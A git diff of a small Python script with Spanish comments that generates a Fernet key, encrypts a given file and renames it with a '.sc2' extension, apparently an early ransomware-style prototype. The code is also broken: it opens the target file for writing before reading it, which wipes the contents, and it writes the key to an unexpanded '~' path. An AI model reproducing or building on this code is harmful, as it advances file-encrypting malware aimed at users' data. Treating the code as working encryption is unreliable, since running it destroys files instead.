@@ -1,19 +1,22 @@
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hashes
-from base64 import urlsafe_b64encode, urlsafe_b64decode
+from cryptography.fernet import Fernet
+import os
 
-clave = "SC2SC2SC2SC2SC2SC2SC2" 
-
-def generate_key(clave):
-    clave = hashes.Hash(hashes.SHA256(), backend=default_backend()).update(clave).finalize()
-def encrypt(key,file):
-    return False
+def generate_key():
+    # GENERA UN LLAVE Y LA GUARDA EN EL ARCHIVO KEY.KEY
+    key = Fernet.generate_key()
+    with open('~/key.key', 'wb') as filekey:
+        filekey.write(key)
+    return key
+def encrypt(key,f):
+    # ENCRIPTA EL ARCHIVO CON LA LLAVE GENERADA
+    fer = Fernet(key)
+    with open(f,'wb') as file:
+        file.write(fer.encrypt(file.read()))
 def replace_file(file):
-    return False
+    os.rename(file,file+'.sc2')
 
 def main(file):
-    key=generate_key(clave)
+    key=generate_key()
     encrypt(key,file)
     replace_file(file)
     return True
